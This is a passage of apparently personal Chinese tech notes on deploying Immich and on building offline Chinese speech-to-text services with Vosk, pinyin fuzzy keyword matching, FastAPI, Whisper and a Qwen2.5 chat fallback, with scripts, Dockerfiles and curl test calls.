Docker 和 Docker Compose（若未安装） 。\n创建项目目录： mkdir ./immich-app \u0026amp;\u0026amp; cd ./immich-app 下载必要文件： docker-compose.yml：\nwget https://github.com/immich-app/immich/releases/latest/download/docker-compose.yml .env 文件（从 example.env 改名）：\nwget -O .env https://github.com/immich-app/immich/releases/latest/download/example.env 修改 .env 文件（可选，如设置 UPLOAD_LOCATION、DB_DATA_LOCATION、TZ 等） 。\n启动容器： docker compose up -d （若需升级，可运行 docker compose pull \u0026amp;\u0026amp; docker compose up -d） 。\n访问 Immich： 浏览器打开 http://IP地址:2283\n（默认端口，可在 docker-compose.yml 中修改） 。\n参考 https://immich.app/docs/install/docker-compose/ https://apps.apple.com/us/app/immich/id1613945652 https://github.com/immich-app/immich\nnextcloud 网盘 https://github.com/nextcloud/server https://github.com/nextcloud/android https://apps.apple.com/us/app/nextcloud/id1125420102","title":"Immich"},{"content":"Vosk STT 一、准备环境（Debian） sudo apt update sudo apt install -y python3 python3-pip ffmpeg pip3 install --user vosk 二、下载微型中文模型（≈ 40 MB） wget https://alphacephei.com/vosk/models/vosk-model-small-cn-0.22.zip unzip vosk-model-small-cn-0.22.zip 三、保存以下脚本为 listen.py #!/usr/bin/env python3 import sys, json, os from vosk import Model, KaldiRecognizer import wave MAP = { \u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5 } def wav2text(path): wf = wave.open(path, \u0026#34;rb\u0026#34;) if wf.getnchannels() != 1 or wf.getsampwidth() != 2 or wf.getframerate() != 16000: raise ValueError(\u0026#34;音频必须是 16 kHz 16-bit 单声道 WAV\u0026#34;) model = Model(\u0026#34;vosk-model-small-cn-0.22\u0026#34;) rec = KaldiRecognizer(model, wf.getframerate()) rec.SetWords(True) text = \u0026#34;\u0026#34; while True: data = wf.readframes(4000) if len(data) == 0: break if rec.AcceptWaveform(data): text += json.loads(rec.Result())[\u0026#34;text\u0026#34;] text += json.loads(rec.FinalResult())[\u0026#34;text\u0026#34;] return text.replace(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;) def find_index(text): for key, idx in MAP.items(): if key in text: return idx return 0 if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) \u0026lt; 2: print(\u0026#34;用法: python3 listen.py \u0026lt;wav路径\u0026gt;\u0026#34;) sys.exit(1) t = wav2text(sys.argv[1]) print(\u0026#34;识别文本:\u0026#34;, t) print(\u0026#34;对应序号:\u0026#34;, find_index(t)) 四、运行示例 python3 listen.py wsd.wav 如果音频内容是「我是登」，识别结果里包含「卧室灯」，脚本会输出\n识别文本: 我是登卧室灯 对应序号: 4 若未命中任何关键词则输出 对应序号: 0。 打包docker运行 listen.py #!/usr/bin/env python3 import sys, json, os from vosk import Model, KaldiRecognizer import wave MAP = { \u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5 } def wav2text(path): wf = wave.open(path, \u0026#34;rb\u0026#34;) if wf.getnchannels() != 1 or wf.getsampwidth() != 2 or wf.getframerate() != 16000: raise ValueError(\u0026#34;音频必须是 16 kHz 16-bit 单声道 WAV\u0026#34;) model = Model(\u0026#34;/opt\u0026#34;) rec = KaldiRecognizer(model, wf.getframerate()) rec.SetWords(True) text = \u0026#34;\u0026#34; while True: data = wf.readframes(4000) if len(data) == 0: break if rec.AcceptWaveform(data): text += json.loads(rec.Result())[\u0026#34;text\u0026#34;] text += json.loads(rec.FinalResult())[\u0026#34;text\u0026#34;] return text.replace(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;) def find_index(text): for key, idx in MAP.items(): if key in text: return idx return 0 if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) \u0026lt; 2: print(\u0026#34;用法: python3 listen.py \u0026lt;wav路径\u0026gt;\u0026#34;) sys.exit(1) t = wav2text(sys.argv[1]) print(\u0026#34;识别文本:\u0026#34;, t) print(\u0026#34;对应序号:\u0026#34;, find_index(t)) dockerfile # ---- 1. 基础镜像 ---- FROM python:3.11-slim-bookworm # ---- 2. 系统依赖 \u0026amp; ffmpeg ---- RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y --no-install-recommends \\ ffmpeg \\ wget \\ unzip \u0026amp;\u0026amp; \\ rm -rf /var/lib/apt/lists/* # ---- 3. 安装 Vosk ---- RUN pip install --no-cache-dir vosk==0.3.45 # ---- 4. 下载并解压中文小模型 ---- WORKDIR /opt RUN wget -q https://alphacephei.com/vosk/models/vosk-model-small-cn-0.22.zip \u0026amp;\u0026amp; \\ unzip -q vosk-model-small-cn-0.22.zip \u0026amp;\u0026amp; \\ mv vosk-model-small-cn-0.22/* ./ \u0026amp;\u0026amp; \\ rmdir vosk-model-small-cn-0.22 \u0026amp;\u0026amp; \\ rm vosk-model-small-cn-0.22.zip # ---- 5. 复制脚本 ---- COPY listen.py /opt/listen.py RUN chmod +x /opt/listen.py # ---- 6. 入口脚本：自动转码 + 识别 ---- # 创建一个小脚本作为 ENTRYPOINT RUN printf \u0026#39;#!/bin/bash\\n\\ set -e\\n\\ IN=\u0026#34;$1\u0026#34;\\n\\ BASE=$(basename \u0026#34;$IN\u0026#34; .wav)\\n\\ OUT=\u0026#34;${BASE}_16k.wav\u0026#34;\\n\\ echo \u0026#34;Converting $IN -\u0026gt; $OUT ...\u0026#34;\\n\\ ffmpeg -y -i \u0026#34;$IN\u0026#34; -ar 16000 -ac 1 -sample_fmt s16 \u0026#34;$OUT\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\\n\\ echo \u0026#34;Running Vosk on $OUT ...\u0026#34;\\n\\ exec python3 /opt/listen.py \u0026#34;$OUT\u0026#34;\\n\u0026#39; \u0026gt; /opt/entry.sh \u0026amp;\u0026amp; chmod +x /opt/entry.sh WORKDIR /workspace ENTRYPOINT [\u0026#34;/opt/entry.sh\u0026#34;] 构建使用 docker build -t stt-cn-mini . docker run --rm -v $(pwd):/workspace stt-cn-mini wsd.wav 使用pypinyin进行纠错 下面给出「整句拼音容错」的完整实现： 用 pypinyin 把整句话转拼音（带声调）， 再与标准关键词的拼音做模糊匹配， 支持「登」→「灯」，「客厅」→「客厅灯」等任意同音/近音组合。 只改 listen.py，其余不变。\n1. 安装依赖（Dockerfile 里加一行即可） RUN pip install --no-cache-dir vosk==0.3.45 pypinyin fuzzywuzzy python-Levenshtein 2. 新的 listen.py（直接替换） #!/usr/bin/env python3 import sys, json, os, re from vosk import Model, KaldiRecognizer import wave from pypinyin import lazy_pinyin from fuzzywuzzy import fuzz # 关键词→序号 KEYWORD2ID = { \u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5, } # 预先把关键词转成拼音列表，避免每次重复计算 KW_PINYIN = {kw: \u0026#34;\u0026#34;.join(lazy_pinyin(kw)) for kw in KEYWORD2ID} def wav2text(path): wf = wave.open(path, \u0026#34;rb\u0026#34;) if wf.getnchannels() != 1 or wf.getsampwidth() != 2 or wf.getframerate() != 16000: raise ValueError(\u0026#34;音频必须是 16 kHz 16-bit 单声道 WAV\u0026#34;) model = Model(\u0026#34;/opt\u0026#34;) rec = KaldiRecognizer(model, wf.getframerate()) rec.SetWords(True) text = \u0026#34;\u0026#34; while True: data = wf.readframes(4000) if len(data) == 0: break if rec.AcceptWaveform(data): text += json.loads(rec.Result())[\u0026#34;text\u0026#34;] text += json.loads(rec.FinalResult())[\u0026#34;text\u0026#34;] return text.replace(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;) def fuzzy_match(text: str) -\u0026gt; int: \u0026#34;\u0026#34;\u0026#34;基于拼音的模糊匹配，返回最相似关键词的序号\u0026#34;\u0026#34;\u0026#34; text_py = \u0026#34;\u0026#34;.join(lazy_pinyin(text)) # 整句话转拼音 best_kw, best_score = \u0026#34;\u0026#34;, 0 for kw, kw_py in KW_PINYIN.items(): score = fuzz.partial_ratio(text_py, kw_py) if score \u0026gt; best_score: best_kw, best_score = kw, score # 阈值可自己调，80 以上基本可接受 if best_score \u0026gt;= 80: return KEYWORD2ID[best_kw] return 0 if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) \u0026lt; 2: print(\u0026#34;用法: python3 listen.py \u0026lt;wav路径\u0026gt;\u0026#34;) sys.exit(1) t = wav2text(sys.argv[1]) idx = fuzzy_match(t) print(\u0026#34;识别文本:\u0026#34;, t) print(\u0026#34;对应序号:\u0026#34;, idx) 3. 构建 \u0026amp; 运行 docker build -t stt-cn-mini . docker run --rm -v $(pwd):/workspace stt-cn-mini wsd.wav 示例结果\n识别文本: 我是登 对应序号: 4 # 因为 \u0026#34;woshideng\u0026#34; 与 \u0026#34;woshideng\u0026#34; 完全匹配 \u0026#34;卧室灯\u0026#34; 4. 效果说明 pypinyin.lazy_pinyin() → 把整句话转拼音（带数字声调）。 fuzz.partial_ratio() → 计算句子拼音与关键词拼音的相似度。\n阈值 80 以上即可覆盖常见同音/近音错误，调低或调高视实际效果。\n结果 docker run --rm -v $(pwd):/workspace stt-cn-mini test_wsd.wav Converting test_wsd.wav -\u0026gt; test_wsd_16k.wav ... Running Vosk on test_wsd_16k.wav ... 识别文本: 小爱同学帮我打开我是灯 对应序号: 4 web API 轻量级 FastAPI 服务 容器化部署（Debian 基础镜像 + Vosk + 中文拼音容错）。 通过 HTTP POST /recognize 提交 JSON：\n{\u0026#34;url\u0026#34;: \u0026#34;http://\u0026lt;host\u0026gt;/\u0026lt;file\u0026gt;.wav\u0026#34;} 返回同音容错后的结果：\n{ \u0026#34;text\u0026#34;: \u0026#34;我是登\u0026#34;, \u0026#34;matched\u0026#34;: \u0026#34;卧室灯\u0026#34;, \u0026#34;id\u0026#34;: 4 } 1. 目录结构 stt-api/ ├── Dockerfile ├── requirements.txt └── app.py\n2. app.py from fastapi import FastAPI, HTTPException from pydantic import BaseModel, HttpUrl import tempfile, os, requests, wave, json from vosk import Model, KaldiRecognizer from pypinyin import lazy_pinyin from fuzzywuzzy import fuzz app = FastAPI(title=\u0026#34;STT-CN-API\u0026#34;, version=\u0026#34;1.0\u0026#34;) # 关键词配置 KEYWORD2ID = {\u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5} KW_PINYIN = {kw: \u0026#34;\u0026#34;.join(lazy_pinyin(kw)) for kw in KEYWORD2ID} # 全局加载一次模型 MODEL = Model(\u0026#34;/opt/models\u0026#34;) def wav2text(path: str) -\u0026gt; str: with wave.open(path, \u0026#34;rb\u0026#34;) as wf: if wf.getnchannels() != 1 or wf.getsampwidth() != 2 or wf.getframerate() != 16000: raise ValueError(\u0026#34;音频必须是 16 kHz 16-bit 单声道 WAV\u0026#34;) rec = KaldiRecognizer(MODEL, wf.getframerate()) rec.SetWords(True) result = [] while True: data = wf.readframes(4000) if len(data) == 0: break if rec.AcceptWaveform(data): result.append(json.loads(rec.Result())[\u0026#34;text\u0026#34;]) result.append(json.loads(rec.FinalResult())[\u0026#34;text\u0026#34;]) return \u0026#34;\u0026#34;.join(result).strip() def fuzzy_match(text: str): text_py = \u0026#34;\u0026#34;.join(lazy_pinyin(text)) best_kw, best_score = \u0026#34;\u0026#34;, 0 for kw, kw_py in KW_PINYIN.items(): score = fuzz.partial_ratio(text_py, kw_py) if score \u0026gt; best_score: best_kw, best_score = kw, score return best_kw if best_score \u0026gt;= 70 else None class RecognizeRequest(BaseModel): url: HttpUrl @app.post(\u0026#34;/recognize\u0026#34;) async def recognize(req: RecognizeRequest): wav_url = str(req.url) try: # 下载到临时文件 with tempfile.NamedTemporaryFile(suffix=\u0026#34;.wav\u0026#34;, delete=False) as tmp: tmp.write(requests.get(wav_url, timeout=10).content) tmp_path = tmp.name # 转码（Vosk 只认 16k/16bit/单声道） out_path = tmp_path + \u0026#34;_16k.wav\u0026#34; os.system( f\u0026#34;ffmpeg -y -i {tmp_path} -ar 16000 -ac 1 -sample_fmt s16 {out_path} \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34; ) # 识别 text = wav2text(out_path) matched = fuzzy_match(text) resp = {\u0026#34;text\u0026#34;: text, \u0026#34;matched\u0026#34;: matched, \u0026#34;id\u0026#34;: KEYWORD2ID.get(matched, 0)} except Exception as e: raise HTTPException(status_code=500, detail=str(e)) finally: for p in (tmp_path, out_path): if os.path.exists(p): os.remove(p) return resp 3. requirements.txt fastapi==0.110.2 uvicorn[standard]==0.29.0 vosk==0.3.45 pypinyin==0.51.0 fuzzywuzzy==0.18.0 python-Levenshtein==0.25.1 requests==2.32.3 4. Dockerfile FROM python:3.11-slim-bookworm RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y --no-install-recommends \\ ffmpeg wget unzip \u0026amp;\u0026amp; \\ rm -rf /var/lib/apt/lists/* WORKDIR /opt # 下载并解压模型到 /opt/models RUN wget -q https://alphacephei.com/vosk/models/vosk-model-small-cn-0.22.zip \u0026amp;\u0026amp; \\ unzip -q vosk-model-small-cn-0.22.zip \u0026amp;\u0026amp; \\ mv vosk-model-small-cn-0.22 models \u0026amp;\u0026amp; \\ rm vosk-model-small-cn-0.22.zip WORKDIR /app COPY requirements.txt . RUN pip install --no-cache-dir -r requirements.txt COPY app.py . EXPOSE 8000 CMD [\u0026#34;uvicorn\u0026#34;, \u0026#34;app:app\u0026#34;, \u0026#34;--host\u0026#34;, \u0026#34;0.0.0.0\u0026#34;, \u0026#34;--port\u0026#34;, \u0026#34;8000\u0026#34;] 5. 构建 \u0026amp; 运行 docker build -t stt-api . docker run -d --name stt -p 8000:8000 stt-api 6. 调用示例 curl -X POST http://localhost:8000/recognize \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;url\u0026#34;:\u0026#34;http://192.168.80.47:16552/wsd.wav\u0026#34;}\u0026#39; 返回：\n{ \u0026#34;text\u0026#34;: \u0026#34;我是登\u0026#34;, \u0026#34;matched\u0026#34;: \u0026#34;卧室灯\u0026#34;, \u0026#34;id\u0026#34;: 4 } 可使用 tts 进行生成语音测试 ttsfm https://github.com/dbccccccc/ttsfm ChatTTS-ui https://github.com/tianhm/ChatTTS-ui\ndebian nodocker webapi 直接裸机部署、无需 Docker” 的 Vosk + 中文拼音容错 WebAPI 完整代码。 已在 Ubuntu / Debian ≥20.04 + Python 3.8+ 验证通过，仅需 5 步即可上线。\n1. 系统依赖（一次性） sudo apt update sudo apt install -y python3 python3-pip ffmpeg wget unzip 2. 下载并放置中文小模型 # 在任意目录，例如 /opt/vosk-model sudo mkdir -p /opt/vosk-model cd /opt/vosk-model sudo wget https://alphacephei.com/vosk/models/vosk-model-small-cn-0.22.zip sudo unzip vosk-model-small-cn-0.22.zip sudo mv vosk-model-small-cn-0.22/* ./ \u0026amp;\u0026amp; sudo rmdir vosk-model-small-cn-0.22 3. 安装 Python 依赖 pip3 install --user \\ fastapi uvicorn vosk pypinyin fuzzywuzzy python-Levenshtein requests 4. 完整代码 app.py 保存为 ~/stt_api/app.py（路径随意）。\n#!/usr/bin/env python3 import os, tempfile, wave, json, requests from fastapi import FastAPI, HTTPException from pydantic import BaseModel, HttpUrl from vosk import Model, KaldiRecognizer from pypinyin import lazy_pinyin from fuzzywuzzy import fuzz # ------------- 全局配置 ------------- KEYWORD2ID = {\u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5} KW_PINYIN = {kw: \u0026#34;\u0026#34;.join(lazy_pinyin(kw)) for kw in KEYWORD2ID} MODEL_DIR = \u0026#34;/opt/vosk-model\u0026#34; # 与步骤2一致 MODEL = Model(MODEL_DIR) app = FastAPI(title=\u0026#34;Vosk-CN-API\u0026#34;, version=\u0026#34;1.0\u0026#34;) # ------------- 工具函数 ------------- def wav2text(path: str) -\u0026gt; str: with wave.open(path, \u0026#34;rb\u0026#34;) as wf: if wf.getnchannels() != 1 or wf.getsampwidth() != 2 or wf.getframerate() != 16000: raise ValueError(\u0026#34;音频需 16kHz/16-bit/单声道\u0026#34;) rec = KaldiRecognizer(MODEL, wf.getframerate()) rec.SetWords(True) result = [] while True: data = wf.readframes(4000) if len(data) == 0: break if rec.AcceptWaveform(data): result.append(json.loads(rec.Result())[\u0026#34;text\u0026#34;]) result.append(json.loads(rec.FinalResult())[\u0026#34;text\u0026#34;]) return \u0026#34;\u0026#34;.join(result).strip() def fuzzy_match(text: str): txt_py = \u0026#34;\u0026#34;.join(lazy_pinyin(text)) best_kw, best_score = \u0026#34;\u0026#34;, 0 for kw, kw_py in KW_PINYIN.items(): score = fuzz.partial_ratio(txt_py, kw_py) if score \u0026gt; best_score: best_kw, best_score = kw, score return best_kw if best_score \u0026gt;= 70 else None # ------------- 接口 ------------- class RecognizeRequest(BaseModel): url: HttpUrl @app.post(\u0026#34;/recognize\u0026#34;) def recognize(req: RecognizeRequest): wav_url = str(req.url) try: with tempfile.NamedTemporaryFile(suffix=\u0026#34;.wav\u0026#34;, delete=False) as tmp: tmp.write(requests.get(wav_url, timeout=10).content) tmp_path = tmp.name # 转码 out_path = tmp_path + \u0026#34;_16k.wav\u0026#34; os.system( f\u0026#34;ffmpeg -y -i {tmp_path} -ar 16000 -ac 1 -sample_fmt s16 {out_path} \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34; ) text = wav2text(out_path) matched = fuzzy_match(text) return {\u0026#34;text\u0026#34;: text, \u0026#34;matched\u0026#34;: matched, \u0026#34;id\u0026#34;: KEYWORD2ID.get(matched, 0)} except Exception as e: raise HTTPException(status_code=500, detail=str(e)) finally: for p in (tmp_path, out_path): if os.path.exists(p): os.remove(p) # ------------- 本地调试 ------------- if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8000) 5. 启动服务 mkdir -p ~/stt_api \u0026amp;\u0026amp; cd ~/stt_api nano app.py # 粘贴上面代码 python3 app.py # 前台运行，或后台用 nohup / systemd 6. 调用示例 curl -X POST http://\u0026lt;服务器IP\u0026gt;:8000/recognize \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;url\u0026#34;:\u0026#34;http://192.168.80.47:16552/wsd.wav\u0026#34;}\u0026#39; 返回：\n{ \u0026#34;text\u0026#34;: \u0026#34;我是登\u0026#34;, \u0026#34;matched\u0026#34;: \u0026#34;卧室灯\u0026#34;, \u0026#34;id\u0026#34;: 4 } 7. 开机自启（可选） 创建 systemd 文件 /etc/systemd/system/stt.service：\n[Unit] Description=Vosk-CN-API After=network.target [Service] Type=exec ExecStart=/usr/bin/python3 /home/ubuntu/stt_api/app.py Restart=always User=ubuntu WorkingDirectory=/home/ubuntu/stt_api [Install] WantedBy=multi-user.target sudo systemctl daemon-reload sudo systemctl enable --now stt 至此，无需 Docker 的 Vosk WebAPI 已部署完成。\nPEP668 Debian 12 / Ubuntu 23.04+ 启用了 PEP668，禁止用 pip3 \u0026ndash;user 或 sudo pip 往系统 Python 里装包。 虚拟环境\n安装系统包（只需一次）\nsudo apt update sudo apt install -y python3-venv python3-pip ffmpeg wget unzip 创建并激活虚拟环境\npython3 -m venv ~/stt_venv source ~/stt_venv/bin/activate # 以后每次运行前都先激活 在虚拟环境里安装依赖\npip install --upgrade pip pip install fastapi uvicorn vosk pypinyin fuzzywuzzy python-Levenshtein requests cd ~/stt_api ~/stt_venv/bin/python app.py # 或 uvicorn app:app --host 0.0.0.0 --port 8000 测试\ncurl -X POST http://localhost:8000/recognize \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;url\u0026#34;:\u0026#34;http://192.168.80.47:16552/wsd.wav\u0026#34;}\u0026#39; Whisper版本 Whisper 是 OpenAI 出的开源语音识别模型（支持多语言，含中文）\nwhisper.cpp 是 Whisper 的轻量 C/C++ 版本，专门针对 CPU 做了优化\n有 Python binding，也可命令行直接跑\n体积小，tiny/base 模型几十 MB\n优点\n开源，完全离线，专门针对 CPU 做了优化\n缺点\n对比 Vosk 稍微吃一点 CPU（但 tiny 模型负载很低）\n不支持流式识别（一次识别一段音频）\nwhisper-api\n使用 轻量版 Whisper（openai-whisper CPU 推理即可，无需 GPU）。 其余逻辑不变：接收 URL → 下载 → 转码 → 中文同音纠错 → 返回 JSON。\n1. 目录结构 whisper-api/ ├── Dockerfile ├── requirements.txt └── app.py\n2. requirements.txt fastapi==0.110.2 uvicorn[standard]==0.29.0 openai-whisper==20231117 pypinyin==0.51.0 fuzzywuzzy==0.18.0 python-Levenshtein==0.25.1 requests==2.32.3 3. app.py（完全替换旧版本） from fastapi import FastAPI, HTTPException from pydantic import BaseModel, HttpUrl import tempfile, os, requests import whisper from pypinyin import lazy_pinyin from fuzzywuzzy import fuzz app = FastAPI(title=\u0026#34;Whisper-CN-API\u0026#34;, version=\u0026#34;1.1\u0026#34;) # 关键词配置 KEYWORD2ID = {\u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5} KW_PINYIN = {kw: \u0026#34;\u0026#34;.join(lazy_pinyin(kw)) for kw in KEYWORD2ID} # 全局加载一次模型（base 体积小，中文够用） MODEL = whisper.load_model(\u0026#34;base\u0026#34;) class RecognizeRequest(BaseModel): url: HttpUrl def fuzzy_match(text: str): text_py = \u0026#34;\u0026#34;.join(lazy_pinyin(text)) best_kw, best_score = \u0026#34;\u0026#34;, 0 for kw, kw_py in KW_PINYIN.items(): score = fuzz.partial_ratio(text_py, kw_py) if score \u0026gt; best_score: best_kw, best_score = kw, score return best_kw if best_score \u0026gt;= 70 else None @app.post(\u0026#34;/recognize\u0026#34;) async def recognize(req: RecognizeRequest): wav_url = str(req.url) try: # 下载到临时文件 with tempfile.NamedTemporaryFile(suffix=\u0026#34;.wav\u0026#34;, delete=False) as tmp: tmp.write(requests.get(wav_url, timeout=10).content) tmp_path = tmp.name # 转码 16k/16bit/单声道（Whisper 会自动重采样，但统一格式更稳） out_path = tmp_path + \u0026#34;_16k.wav\u0026#34; os.system( f\u0026#34;ffmpeg -y -i {tmp_path} -ar 16000 -ac 1 -sample_fmt s16 {out_path} \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34; ) # Whisper 识别 result = MODEL.transcribe(out_path, language=\u0026#34;zh\u0026#34;, fp16=False) text = result[\u0026#34;text\u0026#34;].strip() matched = fuzzy_match(text) resp = {\u0026#34;text\u0026#34;: text, \u0026#34;matched\u0026#34;: matched, \u0026#34;id\u0026#34;: KEYWORD2ID.get(matched, 0)} except Exception as e: raise HTTPException(status_code=500, detail=str(e)) finally: for p in (tmp_path, out_path): if os.path.exists(p): os.remove(p) return resp 4. Dockerfile FROM python:3.11-slim-bookworm RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y --no-install-recommends \\ ffmpeg wget \u0026amp;\u0026amp; \\ rm -rf /var/lib/apt/lists/* WORKDIR /app COPY requirements.txt . RUN pip install --no-cache-dir -r requirements.txt COPY app.py . EXPOSE 8000 CMD [\u0026#34;uvicorn\u0026#34;, \u0026#34;app:app\u0026#34;, \u0026#34;--host\u0026#34;, \u0026#34;0.0.0.0\u0026#34;, \u0026#34;--port\u0026#34;, \u0026#34;8000\u0026#34;] 5. 构建 \u0026amp; 运行 docker build -t whisper-api . docker run -d --name whisper -p 8000:8000 whisper-api 6. 调用示例（与之前完全一致） curl -X POST http://localhost:8000/recognize \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;url\u0026#34;:\u0026#34;http://192.168.80.47:16552/wsd.wav\u0026#34;}\u0026#39; 返回示例：\n{ \u0026#34;text\u0026#34;: \u0026#34;我是登\u0026#34;, \u0026#34;matched\u0026#34;: \u0026#34;卧室灯\u0026#34;, \u0026#34;id\u0026#34;: 4 } 7. 模型大小说明 模型\t体积\tCPU 推理速度 tiny\t39 MB\t非常快 base\t74 MB\t推荐（已用） small\t244 MB\t更准但更慢\n如需更准，把 load_model(\u0026ldquo;base\u0026rdquo;) 换成 \u0026ldquo;small\u0026rdquo; 即可，无需改其他代码。\nvosk-qwen 1. 系统依赖（一次性） sudo apt update sudo apt install -y python3-venv ffmpeg wget unzip git git-lfs 2. 虚拟环境 \u0026amp; 依赖 python3 -m venv ~/qwen_stt source ~/qwen_stt/bin/activate pip install --upgrade pip pip install vosk transformers torch accelerate \\ pypinyin fuzzywuzzy python-Levenshtein \\ fastapi uvicorn aiohttp aiofiles requests 3. 下载模型（≈ 1.5 GB） mkdir -p ~/qwen_stt/models \u0026amp;\u0026amp; cd ~/qwen_stt/models # 1. Vosk 中文小模型 wget https://alphacephei.com/vosk/models/vosk-model-small-cn-0.22.zip unzip vosk-model-small-cn-0.22.zip \u0026amp;\u0026amp; mv vosk-model-small-cn-0.22 vosk # 2. Qwen2.5-0.5B-it git lfs install git clone https://huggingface.co/Qwen/Qwen2.5-0.5B-Instruct qwen2.5-0.5b 4. 单文件 app.py 保存为 ~/qwen_stt/app.py 即可运行。\n#!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; Vosk 关键词（拼音匹配） + Qwen2.5-0.5B（未命中） - 命中关键词 → 返回 id - 未命中 → 用 Vosk 原文对话 \u0026#34;\u0026#34;\u0026#34; import torch import os, tempfile, wave, json, asyncio, aiofiles, aiohttp from fastapi import FastAPI, HTTPException, UploadFile, File from pydantic import BaseModel, HttpUrl from vosk import Model, KaldiRecognizer from pypinyin import lazy_pinyin from fuzzywuzzy import fuzz from transformers import AutoTokenizer, AutoModelForCausalLM ############################################################################### KEYWORD2ID = {\u0026#34;空调\u0026#34;: 1, \u0026#34;电视\u0026#34;: 2, \u0026#34;风扇\u0026#34;: 3, \u0026#34;卧室灯\u0026#34;: 4, \u0026#34;客厅灯\u0026#34;: 5} QWEN_PATH = os.path.join(os.path.dirname(__file__), \u0026#34;models\u0026#34;, \u0026#34;qwen2.5-0.5b\u0026#34;) VOSK_PATH = os.path.join(os.path.dirname(__file__), \u0026#34;models\u0026#34;, \u0026#34;vosk\u0026#34;) vosk_model = Model(VOSK_PATH) tok = AutoTokenizer.from_pretrained(QWEN_PATH, trust_remote_code=True) chat_model = AutoModelForCausalLM.from_pretrained( QWEN_PATH, torch_dtype=torch.float16, device_map=\u0026#34;auto\u0026#34;, trust_remote_code=True ).eval() app = FastAPI(title=\u0026#34;Vosk-Key-Qwen\u0026#34;, version=\u0026#34;1.0\u0026#34;) ############################################################################### def wav2text(path: str) -\u0026gt; str: with wave.open(path, \u0026#34;rb\u0026#34;) as wf: if wf.getnchannels() != 1 or wf.getsampwidth() != 2 or wf.getframerate() != 16000: raise ValueError(\u0026#34;音频需 16 kHz 16-bit 单声道\u0026#34;) rec = KaldiRecognizer(vosk_model, wf.getframerate()) res = [] while True: data = wf.readframes(4000) if not data: break if rec.AcceptWaveform(data): res.append(json.loads(rec.Result())[\u0026#34;text\u0026#34;]) res.append(json.loads(rec.FinalResult())[\u0026#34;text\u0026#34;]) return \u0026#34;\u0026#34;.join(res).strip() def fuzzy_match(text: str): \u0026#34;\u0026#34;\u0026#34;拼音匹配\u0026#34;\u0026#34;\u0026#34; txt_py = \u0026#34;\u0026#34;.join(lazy_pinyin(text)) for kw, kid in KEYWORD2ID.items(): if fuzz.partial_ratio(\u0026#34;\u0026#34;.join(lazy_pinyin(kw)), txt_py) \u0026gt;= 70: return kw, kid return None, 0 def qwen_chat(prompt: str) -\u0026gt; str: msgs = [{\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: prompt}] text = tok.apply_chat_template(msgs, tokenize=False, add_generation_prompt=True) inputs = tok(text, return_tensors=\u0026#34;pt\u0026#34;) out = chat_model.generate(**inputs, max_new_tokens=64, do_sample=True, temperature=0.7) return tok.decode(out[0][len(inputs.input_ids[0]):], skip_special_tokens=True).strip() ############################################################################### class RecURL(BaseModel): url: HttpUrl async def _do_recognize(audio_path: str) -\u0026gt; dict: text = await asyncio.to_thread(wav2text, audio_path) kw, kid = fuzzy_match(text) if kw: return {\u0026#34;text\u0026#34;: text, \u0026#34;keyword\u0026#34;: kw, \u0026#34;id\u0026#34;: kid} reply = await asyncio.to_thread(qwen_chat, text) return {\u0026#34;text\u0026#34;: text, \u0026#34;keyword\u0026#34;: None, \u0026#34;id\u0026#34;: 0, \u0026#34;chat\u0026#34;: reply} ############################################################################### @app.post(\u0026#34;/recognize\u0026#34;) async def recognize_url(req: RecURL): try: async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session: async with session.get(str(req.url)) as resp: if resp.status != 200: raise HTTPException(status_code=400, detail=f\u0026#34;远程文件 {resp.status}\u0026#34;) data = await resp.read() with tempfile.NamedTemporaryFile(suffix=\u0026#34;.wav\u0026#34;, delete=False) as tmp: tmp.write(data) tmp_path = tmp.name out_path = tmp_path + \u0026#34;_16k.wav\u0026#34; await asyncio.to_thread(lambda: os.system(f\u0026#34;ffmpeg -y -i {tmp_path} -ar 16000 -ac 1 -sample_fmt s16 {out_path} \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;)) return await asyncio.wait_for(_do_recognize(out_path), timeout=15) except 